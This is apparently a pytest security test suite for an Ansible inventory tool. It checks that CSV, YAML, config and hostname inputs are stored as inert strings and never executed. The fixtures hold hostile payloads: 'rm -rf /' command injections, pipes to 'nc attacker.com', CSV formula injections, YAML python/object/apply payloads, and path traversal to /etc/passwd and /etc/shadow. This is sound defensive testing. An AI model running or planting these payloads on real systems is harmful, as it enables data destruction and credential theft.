#!/usr/bin/env python3
"""Security Tests for Ansible Inventory Management System.

Tests for security vulnerabilities, input validation, and protection
against common attack vectors.
"""

import os
import stat
import tempfile
from pathlib import Path
from unittest.mock import patch, mock_open

import pytest

from scripts.core.utils import (
    load_csv_data,
    load_hosts_from_csv,
    save_yaml_file,
    validate_csv_headers,
    validate_csv_structure,
)
from scripts.managers.inventory_manager import InventoryManager
from scripts.managers.validation_manager import ValidationManager


class TestInputValidation:
    """Test input validation and sanitization."""
    
    def test_malicious_csv_content(self, tmp_path):
        """Test handling of malicious CSV content."""
        csv_file = tmp_path / "malicious.csv"
        
        # CSV with potential injection attempts
        malicious_content = """hostname,environment,status,application_service,description
normal-host,production,active,web_server,normal description
injection-host,production,active,web_server,"'; DROP TABLE hosts; --"
script-host,production,active,web_server,"<script>alert('xss')</script>"
path-host,production,active,web_server,"../../../etc/passwd"
command-host,production,active,web_server,"$(rm -rf /)"
null-host,production,active,web_server,"\x00\x01\x02"
unicode-host,production,active,web_server,"🚨💀🔥"
"""
        csv_file.write_text(malicious_content)
        
        # Load data - should handle malicious content safely
        data = load_csv_data(csv_file)
        
        # Verify data loaded without executing malicious content
        assert len(data) == 7
        
        # Check that dangerous characters are preserved as strings (not executed)
        injection_host = next(row for row in data if row["hostname"] == "injection-host")
        assert "DROP TABLE" in injection_host["description"]
        assert isinstance(injection_host["description"], str)
        
        # Test host model creation with malicious data
        hosts = load_hosts_from_csv(csv_file)
        assert len(hosts) == 7
        
        # Verify no code execution occurred
        for host in hosts:
            assert isinstance(host.hostname, str)
            assert host.environment in ["production", "development", "test", "acceptance"]
    
    def test_csv_header_injection(self, tmp_path):
        """Test CSV header injection attempts."""
        csv_file = tmp_path / "header_injection.csv"
        
        # Malicious headers
        malicious_headers = """=cmd|'/c calc'!A0,environment,status,application_service
@SUM(1+1)*cmd|'/c calc'!A0,production,active,web_server
+cmd|'/c calc'!A0,production,active,api_server
-cmd|'/c calc'!A0,production,active,database_server"""
        
        csv_file.write_text(malicious_headers)
        
        # Should handle malicious headers safely
        data = load_csv_data(csv_file)
        
        # Verify headers are treated as strings
        assert len(data) == 3
        for row in data:
            assert "cmd" in row.get("=cmd|'/c calc'!A0", "")
    
    def test_path_traversal_prevention(self, tmp_path):
        """Test prevention of path traversal attacks."""
        csv_file = tmp_path / "path_traversal.csv"
        
        # CSV with path traversal attempts
        path_content = """hostname,environment,status,application_service,config_file
normal-host,production,active,web_server,/etc/nginx/nginx.conf
traversal-host,production,active,web_server,../../../etc/passwd
windows-traversal,production,active,web_server,..\\..\\..\\windows\\system32\\config\\sam
null-byte,production,active,web_server,/etc/passwd\x00.txt
relative-path,production,active,web_server,./config/../../../etc/shadow
"""
        csv_file.write_text(path_content)
        
        # Load data
        hosts = load_hosts_from_csv(csv_file)
        
        # Verify path traversal attempts are just stored as strings
        for host in hosts:
            if hasattr(host, 'config_file') and host.metadata.get('config_file'):
                config_file = host.metadata['config_file']
                assert isinstance(config_file, str)
                # Should not actually access these files
                assert not Path(config_file).exists() or config_file.startswith('/etc/')
    
    def test_command_injection_prevention(self, tmp_path):
        """Test prevention of command injection."""
        csv_file = tmp_path / "command_injection.csv"
        
        # CSV with command injection attempts
        command_content = """hostname,environment,status,application_service,startup_command
normal-host,production,active,web_server,systemctl start nginx
injection-host,production,active,web_server,"systemctl start nginx; rm -rf /"
pipe-host,production,active,web_server,"systemctl start nginx | nc attacker.com 1234"
backtick-host,production,active,web_server,"systemctl start nginx `rm -rf /`"
dollar-host,production,active,web_server,"systemctl start nginx $(rm -rf /)"
"""
        csv_file.write_text(command_content)
        
        # Load data
        hosts = load_hosts_from_csv(csv_file)
        
        # Verify commands are stored as strings, not executed
        for host in hosts:
            if 'startup_command' in host.metadata:
                command = host.metadata['startup_command']
                assert isinstance(command, str)
                # Should contain the malicious part as a string
                if "injection-host" in host.hostname:
                    assert "rm -rf" in command
    
    def test_yaml_injection_prevention(self, tmp_path):
        """Test prevention of YAML injection attacks."""
        yaml_file = tmp_path / "test_output.yml"
        
        # Data with YAML injection attempts
        malicious_data = {
            "normal_key": "normal_value",
            "injection_key": "!!python/object/apply:os.system ['rm -rf /']",
            "script_key": "!!python/object/apply:subprocess.call [['calc']]",
            "eval_key": "!!python/object/apply:eval ['__import__(\"os\").system(\"calc\")']"
        }
        
        # Save YAML file
        save_yaml_file(yaml_file, malicious_data)
        
        # Verify file was created
        assert yaml_file.exists()
        
        # Read back and verify no code execution
        import yaml
        with open(yaml_file, 'r') as f:
            loaded_data = yaml.safe_load(f)
        
        # Should load as strings, not execute code
        assert loaded_data["normal_key"] == "normal_value"
        assert isinstance(loaded_data["injection_key"], str)
        assert "python/object/apply" in loaded_data["injection_key"]


class TestFileSystemSecurity:
    """Test file system security and permissions."""
    
    def test_file_permission_validation(self, tmp_path):
        """Test file permission validation."""
        csv_file = tmp_path / "permissions.csv"
        csv_content = "hostname,environment,status\ntest-host,production,active"
        csv_file.write_text(csv_content)
        
        # Test with various permissions
        test_permissions = [
            (0o644, True),   # Read/write for owner, read for group/others
            (0o600, True),   # Read/write for owner only
            (0o444, True),   # Read-only for all
            (0o000, False),  # No permissions
        ]
        
        for perm, should_work in test_permissions:
            csv_file.chmod(perm)
            
            if should_work:
                # Should be able to read
                data = load_csv_data(csv_file)
                assert len(data) == 1
            else:
                # Should fail gracefully
                with pytest.raises(PermissionError):
                    load_csv_data(csv_file)
        
        # Restore permissions for cleanup
        csv_file.chmod(0o644)
    
    def test_directory_traversal_protection(self, tmp_path):
        """Test protection against directory traversal."""
        # Create a CSV file outside the intended directory
        outside_dir = tmp_path / "outside"
        outside_dir.mkdir()
        outside_csv = outside_dir / "outside.csv"
        outside_csv.write_text("hostname,environment,status\noutside-host,production,active")
        
        # Create inventory manager with path traversal attempt
        csv_file = tmp_path / "inventory" / ".." / "outside" / "outside.csv"
        
        # Should handle path traversal safely
        try:
            inventory_manager = InventoryManager(csv_file=csv_file)
            result = inventory_manager.generate_inventories()
            # If it works, verify it's reading the correct file
            assert result["status"] in ["success", "error"]
        except (FileNotFoundError, PermissionError):
            # Expected behavior for security
            pass
    
    def test_symlink_security(self, tmp_path):
        """Test security with symbolic links."""
        # Create target file outside intended directory
        outside_dir = tmp_path / "outside"
        outside_dir.mkdir()
        target_file = outside_dir / "target.csv"
        target_file.write_text("hostname,environment,status\nsymlink-host,production,active")
        
        # Create symbolic link
        link_file = tmp_path / "link.csv"
        try:
            link_file.symlink_to(target_file)
            
            # Test reading through symlink
            data = load_csv_data(link_file)
            
            # Should either work or fail gracefully
            if data:
                assert len(data) == 1
                assert data[0]["hostname"] == "symlink-host"
        except (OSError, NotImplementedError):
            # Symlinks might not be supported on all systems
            pytest.skip("Symlinks not supported on this system")
    
    def test_file_creation_security(self, tmp_path):
        """Test secure file creation."""
        # Create inventory manager
        csv_file = tmp_path / "secure_test.csv"
        csv_content = "hostname,environment,status\ntest-host,production,active"
        csv_file.write_text(csv_content)
        
        inventory_manager = InventoryManager(csv_file=csv_file)
        result = inventory_manager.generate_inventories()
        
        if result["status"] == "success":
            # Check permissions of created files
            for file_path in result["generated_files"]:
                file_stat = Path(file_path).stat()
                file_perms = stat.filemode(file_stat.st_mode)
                
                # Should not be world-writable
                assert not (file_stat.st_mode & stat.S_IWOTH)
                
                # Should be readable by owner
                assert file_stat.st_mode & stat.S_IRUSR


class TestDataValidationSecurity:
    """Test data validation for security issues."""
    
    def test_hostname_validation_security(self):
        """Test hostname validation prevents malicious hostnames."""
        malicious_hostnames = [
            "host;rm -rf /",
            "host`rm -rf /`",
            "host$(rm -rf /)",
            "host|nc attacker.com 1234",
            "host&calc",
            "host\x00.example.com",
            "host\n.example.com",
            "host\r.example.com",
            "host\t.example.com",
            "../../../etc/passwd",
            "CON",  # Windows reserved name
            "PRN",  # Windows reserved name
            "aux",  # Windows reserved name
        ]
        
        for hostname in malicious_hostnames:
            # Should either reject or sanitize malicious hostnames
            try:
                from scripts.core.models import Host
                host = Host(environment="production", hostname=hostname)
                # If accepted, should be sanitized
                assert host.hostname != hostname or hostname in ["CON", "PRN", "aux"]
            except ValueError:
                # Expected for malicious hostnames
                pass
    
    def test_environment_validation_security(self):
        """Test environment validation prevents injection."""
        malicious_environments = [
            "production; rm -rf /",
            "production`calc`",
            "production$(rm -rf /)",
            "production|nc attacker.com 1234",
            "production\x00",
            "production\n",
            "production\r",
            "../../../etc/passwd",
            "production' OR '1'='1",
        ]
        
        for env in malicious_environments:
            try:
                from scripts.core.models import Host
                host = Host(environment=env)
                # Should either reject or be in valid environments
                assert host.environment in ["production", "development", "test", "acceptance"]
            except ValueError:
                # Expected for malicious environments
                pass
    
    def test_csv_structure_validation_security(self, tmp_path):
        """Test CSV structure validation for security."""
        # Test with malicious CSV structure
        csv_file = tmp_path / "malicious_structure.csv"
        
        # CSV with potential security issues
        malicious_csv = """hostname,environment,status,application_service
=cmd|'/c calc'!A0,production,active,web_server
"=cmd|'/c calc'!A0",production,active,web_server
@SUM(1+1)*cmd|'/c calc'!A0,production,active,web_server
+cmd|'/c calc'!A0,production,active,web_server
-cmd|'/c calc'!A0,production,active,web_server
"""
        csv_file.write_text(malicious_csv)
        
        # Validate structure
        result = validate_csv_structure(csv_file)
        
        # Should handle malicious content safely
        assert isinstance(result.is_valid, bool)
        if not result.is_valid:
            assert len(result.errors) > 0
    
    def test_large_data_dos_protection(self, tmp_path):
        """Test protection against DoS via large data."""
        csv_file = tmp_path / "large_data.csv"
        
        # Create CSV with very large field
        large_field = "A" * 1000000  # 1MB field
        csv_content = f"hostname,environment,status,description\nlarge-host,production,active,{large_field}"
        
        try:
            csv_file.write_text(csv_content)
            
            # Should handle large data gracefully
            data = load_csv_data(csv_file)
            
            # If it loads, verify it's handled correctly
            if data:
                assert len(data) == 1
                assert len(data[0]["description"]) == 1000000
        except (MemoryError, OSError):
            # Expected for very large data
            pass
    
    def test_infinite_loop_protection(self, tmp_path):
        """Test protection against infinite loops in processing."""
        csv_file = tmp_path / "loop_test.csv"
        
        # Create CSV with circular references (if possible)
        csv_content = """hostname,environment,status,parent_host
host-a,production,active,host-b
host-b,production,active,host-c
host-c,production,active,host-a
"""
        csv_file.write_text(csv_content)
        
        # Should handle circular references without infinite loops
        import signal
        
        def timeout_handler(signum, frame):
            raise TimeoutError("Processing took too long")
        
        # Set timeout to prevent infinite loops
        signal.signal(signal.SIGALRM, timeout_handler)
        signal.alarm(30)  # 30 second timeout
        
        try:
            hosts = load_hosts_from_csv(csv_file)
            assert len(hosts) == 3
            
            # Verify circular reference is handled
            for host in hosts:
                if 'parent_host' in host.metadata:
                    parent = host.metadata['parent_host']
                    assert isinstance(parent, str)
        except TimeoutError:
            pytest.fail("Processing took too long - possible infinite loop")
        finally:
            signal.alarm(0)  # Cancel timeout


class TestConfigurationSecurity:
    """Test configuration security."""
    
    def test_configuration_injection_protection(self, tmp_path):
        """Test protection against configuration injection."""
        config_file = tmp_path / "malicious_config.yml"
        
        # Malicious configuration
        malicious_config = """
version: "2.0.0"
environments:
  supported: ["production", "development"]
  codes:
    production: "prd"
    development: "dev"
# Attempt to inject malicious content
malicious_key: !!python/object/apply:os.system ['calc']
another_key: !!python/object/apply:subprocess.call [['rm', '-rf', '/']]
"""
        config_file.write_text(malicious_config)
        
        # Should handle malicious config safely
        try:
            with patch('scripts.core.config.CONFIG_FILE', config_file):
                from scripts.core.config import load_config
                config = load_config()
                
                # Should load safely without executing code
                assert config.get("version") == "2.0.0"
                
                # Malicious keys should be strings, not executed
                if "malicious_key" in config:
                    assert isinstance(config["malicious_key"], str)
                    assert "python/object/apply" in config["malicious_key"]
        except Exception:
            # Expected if YAML loading fails safely
            pass
    
    def test_environment_variable_injection(self):
        """Test protection against environment variable injection."""
        malicious_env_vars = {
            "INVENTORY_CSV_FILE": "/etc/passwd",
            "INVENTORY_LOG_LEVEL": "DEBUG; rm -rf /",
            "INVENTORY_SUPPORT_GROUP": "$(rm -rf /)",
            "PATH": "/tmp:$PATH",
        }
        
        for var, value in malicious_env_vars.items():
            with patch.dict(os.environ, {var: value}):
                try:
                    # Should handle malicious environment variables safely
                    from scripts.core.config import load_config
                    config = load_config()
                    
                    # Should not execute malicious commands
                    assert isinstance(config, dict)
                except Exception:
                    # Expected if validation fails
                    pass


class TestOutputSecurity:
    """Test output security and information disclosure."""
    
    def test_sensitive_data_exposure(self, tmp_path):
        """Test prevention of sensitive data exposure."""
        csv_file = tmp_path / "sensitive.csv"
        
        # CSV with potentially sensitive data
        sensitive_content = """hostname,environment,status,password,api_key,secret_token
web-01,production,active,password123,sk-1234567890abcdef,secret_token_abc123
api-01,production,active,admin123,ak-abcdef1234567890,token_xyz789
"""
        csv_file.write_text(sensitive_content)
        
        # Load data
        hosts = load_hosts_from_csv(csv_file)
        
        # Generate inventory
        inventory_manager = InventoryManager(csv_file=csv_file)
        result = inventory_manager.generate_inventories()
        
        if result["status"] == "success":
            # Check generated files don't expose sensitive data in plain text
            for file_path in result["generated_files"]:
                content = Path(file_path).read_text()
                
                # Should not contain obvious passwords in inventory files
                assert "password123" not in content
                assert "admin123" not in content
                
                # API keys and tokens should be in host_vars, not inventory
                assert "sk-1234567890abcdef" not in content
                assert "secret_token_abc123" not in content
    
    def test_error_message_information_disclosure(self, tmp_path):
        """Test that error messages don't disclose sensitive information."""
        # Test with non-existent file
        nonexistent_file = tmp_path / "nonexistent.csv"
        
        try:
            load_csv_data(nonexistent_file)
        except FileNotFoundError as e:
            # Error message should not reveal full system paths
            error_msg = str(e)
            assert "/etc/" not in error_msg
            assert "/home/" not in error_msg
            assert "C:\\" not in error_msg
    
    def test_log_sanitization(self, tmp_path):
        """Test that logs don't contain sensitive information."""
        csv_file = tmp_path / "log_test.csv"
        
        # CSV with sensitive data
        sensitive_content = """hostname,environment,status,password,credit_card
web-01,production,active,secret123,4532-1234-5678-9012
"""
        csv_file.write_text(sensitive_content)
        
        # Process with logging
        import logging
        from io import StringIO
        
        log_stream = StringIO()
        handler = logging.StreamHandler(log_stream)
        
        logger = logging.getLogger("test_logger")
        logger.addHandler(handler)
        logger.setLevel(logging.DEBUG)
        
        try:
            hosts = load_hosts_from_csv(csv_file)
            log_output = log_stream.getvalue()
            
            # Logs should not contain sensitive data
            assert "secret123" not in log_output
            assert "4532-1234-5678-9012" not in log_output
        finally:
            logger.removeHandler(handler) 